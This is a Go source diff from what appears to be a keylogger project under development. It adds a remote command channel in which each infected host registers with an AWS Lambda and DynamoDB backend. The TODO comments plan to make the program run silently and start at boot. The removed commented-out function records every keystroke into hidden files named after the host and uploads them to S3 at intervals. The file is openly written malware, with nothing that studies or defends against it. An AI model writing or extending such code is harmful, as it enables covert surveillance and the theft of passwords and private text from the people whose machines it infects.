@@ -4,6 +4,7 @@ import (
 	"fmt"
 	"os"
 	"time"
+	"encoding/json"
 	"github.com/robotn/gohook"
 	"github.com/joho/godotenv"
 
@@ -11,11 +12,19 @@ import (
 	"github.com/aws/aws-sdk-go/aws/session"
 	"github.com/aws/aws-sdk-go/service/s3"
 	"github.com/aws/aws-sdk-go/service/dynamodb"
+	"github.com/aws/aws-sdk-go/service/lambda"
 )
 
 // TO IMPLEMENT:
 // Make it run silently in the bg
 // Find a way to implement boot on startup
+// AWS Lambda gets notified that a curr_cmd gets changed in dynamoDB and then sends a req to change the cmd in GO
+
+type keylog_lambda struct {
+	Function   string `json:"function"`
+	HostName   string `json:"hostName"`
+	Cmd        string `json:"cmd"`
+}
 
 
 func main() {
@@ -157,101 +166,27 @@ func getCmd(hostName string) string {
 }
 
 func putHost(hostName string) error {
-
-	svc := dynamodb.New(session.New())
-	input := &dynamodb.PutItemInput{
-		TableName:	aws.String("Keylog-table"),
-		Item:		map[string]*dynamodb.AttributeValue{
-			"hostName": {
-				S: aws.String(hostName),
-			},
-			"curr_cmd": {
-				S: aws.String("idle"),
-			},
-		},
+	
+	sess := session.Must(session.NewSessionWithOptions(session.Options{
+		SharedConfigState: session.SharedConfigEnable,
+	}))
+	
+	client := lambda.New(sess, &aws.Config{Region: aws.String("ap-southeast-2")})
+	request := keylog_lambda{
+		Function:   "set_cmd",
+		HostName: hostName,
+		Cmd:      "idle",
 	}
 
-	_, err := svc.PutItem(input)
+	payload, err := json.Marshal(request)
+	if err != nil {
+		panic(err)
+	}
+
+	_, err = client.Invoke(&lambda.InvokeInput{FunctionName: aws.String("keylog_lambda"), Payload: payload})
 	if err != nil {
 		panic(err)
 	}
 
 	return err
 }
-
-// func keylog(string hostName) {
-
-// 	// Start the listening process
-// 	evChan := hook.Start()
-// 	defer hook.End()
-
-// 	var lastTime time.Time
-// 	runTime := time.Now()
-
-// 	// hostName, err := os.Hostname()
-// 	// if err != nil {
-// 	// 	panic(err)
-// 	// }
-
-// 	// need to test if the name actually changes.
-// 	fileName := fmt.Sprintf(".%s - %s %s.txt",
-// 	hostName,
-// 	runTime.Format("Jan 02 2006"),
-// 	runTime.Format(time.Kitchen))
-
-// 	file, err := os.Create(fileName)
-// 	if err != nil {
-// 		panic(err)
-// 	}
-// 	defer file.Close()
-
-// 	for ev := range evChan {
-// 		if ev.Kind == hook.KeyDown {
-// 			// 27 == esc - temp
-// 			if ev.Keychar == 27 {
-// 				err = uploadFile(fileName)
-// 				os.Remove(fileName)
-// 				if err != nil {
-// 					panic(err)
-// 				}
-// 				break
-// 			}
-
-// 			// To change - Idk if i should set this to 1 hr / 6 hrs ?
-// 			if time.Since(runTime).Minutes() >= 1 {
-// 				err = uploadFile(fileName)
-// 				os.Remove(fileName)
-// 				if err != nil {
-// 					panic(err)
-// 				}
-// 				file.Close()
-// 				fileName := fmt.Sprintf(".%s - %s %s.txt",
-// 				hostName,
-// 				runTime.Format("Jan 02 2006"),
-// 				runTime.Format(time.Kitchen))
-// 				file, err = os.Create(fileName)
-// 				if err != nil {
-// 					panic(err)
-// 				}
-// 				runTime = time.Now()
-// 			}
-
-// 			// Calcs diff between time
-// 			now := time.Now()
-// 			var diff time.Duration
-// 			if !lastTime.IsZero() {
-// 				diff = now.Sub(lastTime)
-// 			}
-// 			lastTime = now
-
-// 			// If diff > 5 print a new line for ease of reading
-// 			if diff.Seconds() > 5 {
-// 				file.WriteString("\n")
-// 			}
-
-// 			// Print to file any keystroke recorded and their keychar value
-// 			file.WriteString(hook.RawcodetoKeychar(ev.Rawcode))
-
-// 		}
-// 	}
-// }
